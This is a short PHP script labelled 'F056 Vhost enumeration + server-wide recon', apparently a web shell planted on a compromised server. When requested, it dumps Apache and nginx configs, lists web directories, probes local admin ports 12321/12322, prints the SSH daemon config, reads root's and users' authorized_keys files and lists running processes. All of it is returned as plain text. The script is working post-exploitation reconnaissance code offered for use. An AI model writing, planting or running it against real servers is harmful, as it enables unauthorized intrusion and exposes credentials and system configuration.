<?php
// F056 Vhost enumeration + server-wide recon
header('Content-Type: text/plain; charset=utf-8');

echo "=== APACHE VHOSTS ===\n";
$vhosts = [
    '/etc/apache2/sites-enabled/000-default.conf',
    '/etc/apache2/sites-enabled/adminer.conf',
    '/etc/apache2/sites-enabled/*',
    '/etc/apache2/apache2.conf',
    '/etc/nginx/sites-enabled/*',
    '/etc/nginx/conf.d/*',
    '/etc/nginx/nginx.conf',
];
foreach ($vhosts as $v) {
    $matches = glob($v);
    foreach ($matches as $m) {
        if (is_file($m) && is_readable($m)) {
            echo "--- $m ---\n";
            echo file_get_contents($m) . "\n\n";
        }
    }
}

echo "=== /var/www CONTENTS ===\n";
echo shell_exec('ls -la /var/www/ 2>&1') . "\n";
echo shell_exec('ls -la /var/www/web/ 2>&1') . "\n";

echo "=== PORT 12321/12322 CHECK ===\n";
echo shell_exec('curl -s http://127.0.0.1:12321/ 2>&1 | head -20') . "\n";
echo shell_exec('curl -s http://127.0.0.1:12322/ 2>&1 | head -20') . "\n";

echo "=== SSH CONFIG ===\n";
echo shell_exec('cat /etc/ssh/sshd_config 2>&1 | grep -v "^#" | grep -v "^$"') . "\n";

echo "=== AUTHORIZED KEYS ===\n";
echo shell_exec('cat /root/.ssh/authorized_keys 2>&1') . "\n";
echo shell_exec('cat /home/*/.ssh/authorized_keys 2>&1') . "\n";

echo "=== PROCESSES ===\n";
echo shell_exec('ps aux 2>&1 | head -30') . "\n";

echo "=== END ===\n";
?>
